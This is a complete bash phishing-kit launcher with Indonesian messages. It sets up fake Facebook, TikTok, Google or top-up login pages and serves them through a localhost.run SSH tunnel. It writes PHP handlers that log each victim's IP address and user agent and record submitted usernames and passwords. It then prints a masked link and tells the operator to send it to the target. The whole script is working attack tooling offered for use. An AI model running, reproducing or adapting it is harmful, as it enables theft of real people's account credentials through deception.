#!/bin/bash

R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

SERVICE_NAME="$1"
SERVICE_SUB="$2"
PORT="3333"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR" || exit 1

rm -f ip.txt Log.log .lhr.log notify.log 2>/dev/null

trap 'printf "\n${R}[!] Dihentikan...${N}\n"; stop; return 0' INT TERM

stop() {
    killall -9 php ssh 2>/dev/null
    rm -f ip.txt Log.log .lhr.log notify.log 2>/dev/null
    exit 0
}

catat_ip() {
    if [[ -f "ip.txt" ]]; then
        while IFS= read -r line; do
            if [[ "$line" =~ ^IP: ]]; then
                echo -e "${W}╭─────────────────────────────────────────────────────────────╮"
                echo -e "${W}│  [ ${G}!!${W} ] ${G} Target membuka link!"
                echo -e "${W}│  [ ${G}✦${W} ] ${W}🌐 ${line}"
                echo -e "${W}╰─────────────────────────────────────────────────────────────╯"
            elif [[ "$line" =~ ^LOGIN: ]]; then
                echo -e "${W}╭─────────────────────────────────────────────────────────────╮"
                echo -e "${W}│  [ ${G}✦${W} ] ${R}🔑 Target login!"
                echo -e "${W}│  [ ${G}✦${W} ] ${W}${line}"
                echo -e "${W}╰─────────────────────────────────────────────────────────────╯"
            fi
        done < "ip.txt"
        rm -f ip.txt
    fi
}

cek_notifikasi() {
    if [[ -f "notify.log" ]]; then
        count=$(cat notify.log | tail -n 1 | tr -d '\r\n')
        if [[ -n "$count" ]]; then
            echo -e "${W}╭─────────────────────────────────────────────────────────────╮"
            echo -e "${W}│  [ ${G}✦${W} ] ${G}[+] Notifikasi: $count"
            echo -e "${W}╰─────────────────────────────────────────────────────────────╯"
            rm -f notify.log
        fi
    fi
}

tunggu_target() {
    echo -e "\n${Y}⏳ Menunggu aktivitas... (Ctrl+C untuk stop monitor)${N}\n"
    while true; do
        catat_ip
        cek_notifikasi
        sleep 0.5
    done
}

start_tunnel() {
    local HOST="127.0.0.1"
    local PORT="3333"

    fuser -k "$PORT"/tcp >/dev/null 2>&1

    # Buat folder forwarding_link
    mkdir -p forwarding_link

    # Copy template sesuai layanan
    case "$SERVICE_SUB" in
        facebook)
            cp templates/facebook.html forwarding_link/index2.html 2>/dev/null || cp templates/facebook.html index2.html
            ;;
        topup)
            cp templates/topup.html forwarding_link/index2.html 2>/dev/null || cp templates/topup.html index2.html
            ;;
        tiktok)
            cp templates/tiktok.html forwarding_link/index2.html 2>/dev/null || cp templates/tiktok.html index2.html
            ;;
        google)
            cp templates/google.html forwarding_link/index2.html 2>/dev/null || cp templates/google.html index2.html
            ;;
        *)
            echo -e "${R}[!] Template tidak ditemukan!${N}"
            stop
            ;;
    esac

    # Buat login.php kalo ga ada
    if [[ ! -f "login.php" ]]; then
        cat > login.php << 'EOF'
<?php
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

$log = "LOGIN: username=$username | password=$password\n";
file_put_contents('ip.txt', $log, FILE_APPEND);
file_put_contents('notify.log', "1\n", FILE_APPEND);

header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
?>
EOF
    fi

    # Buat ip.php kalo ga ada
    if [[ ! -f "ip.php" ]]; then
        cat > ip.php << 'EOF'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

$log = "IP: $ip | Time: $time | UA: $user_agent\n";
file_put_contents('ip.txt', $log, FILE_APPEND);
?>
EOF
    fi

    # Buat template.php
    cat > template.php << 'EOF'
<?php
include 'ip.php';

$log = file_get_contents('.lhr.log');
preg_match('/https:\/\/[a-z0-9]*\.lhr\.life/', $log, $matches);

if (isset($matches[0])) {
    header('Location: ' . $matches[0] . '/index2.html');
} else {
    header('Location: https://www.whatsapp.com');
}
exit();
?>
EOF

    php -S "$HOST":"$PORT" >/dev/null 2>&1 &
    sleep 2

    echo -e "${W}╭─────────────────────────────────────────────────────────────╮"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}✔ Layanan  : ${W}${SERVICE_NAME}"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}✔ Host     : ${W}${HOST}"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}✔ Port     : ${W}${PORT}"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}✔ Status   : ${Y}Menjalankan PHP server..."
    echo -e "${W}╰─────────────────────────────────────────────────────────────╯"

    echo -e "${W}╭─────────────────────────────────────────────────────────────╮"
    echo -e "${W}│  [${G}✦${W}] ${G}✔ Status   : ${Y}Membuat tunnel localhost.run..."
    echo -e "${W}╰─────────────────────────────────────────────────────────────╯"

    killall -9 ssh 2>/dev/null

    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:"$PORT" nokey@localhost.run > .lhr.log 2>&1 &

    local count=0
    local max_wait=30
    local LHR_LINK=""

    while [[ $count -lt $max_wait ]]; do
        if [[ -s .lhr.log ]]; then
            LHR_LINK=$(grep -o 'https://[a-z0-9]*\.lhr\.life' .lhr.log | head -n1)
            if [[ -n "$LHR_LINK" ]]; then
                break
            fi
        fi
        sleep 1
        ((count++))
    done

    if [[ -z "$LHR_LINK" ]]; then
        echo -e "${R}[!] Gagal tunnel. Silahkan Coba lagi!${N}"
        stop
    fi

    CLEAN_DOMAIN="${LHR_LINK#https://}"
    MASK="${SERVICE_SUB}-secure"

    echo -e "${W}╭─────────────────────────────────────────────────────────────╮"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}✅ Tunnel aktif!"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}📢 Kirim link ini ke target:"
    echo -e "${W}│  [ ${G}✦${W} ] ${W}${LHR_LINK}"
    echo -e "${W}│"
    echo -e "${W}│  [ ${G}✦${W} ] ${Y}💡 Link alternatif (masking):"
    echo -e "${W}│  [ ${G}✦${W} ] ${W}https://$MASK@$CLEAN_DOMAIN"
    echo -e "${W}│"
    echo -e "${W}│  [ ${G}✦${W} ] ${Y}💡 Pantau aktivitas:"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}1. IP otomatis tercatat saat target buka link"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}2. Login credentials tercatat"
    echo -e "${W}│  [ ${G}✦${W} ] ${G}3. Cek menu [5] untuk lihat log"
    echo -e "${W}╰─────────────────────────────────────────────────────────────╯"

    cp template.php index.php

    tunggu_target
}

if [[ -z "$SERVICE_NAME" || -z "$SERVICE_SUB" ]]; then
    echo -e "${R}[!] Usage: $0 <SERVICE_NAME> <SERVICE_SUB>${N}"
    exit 1
fi

start_tunnel
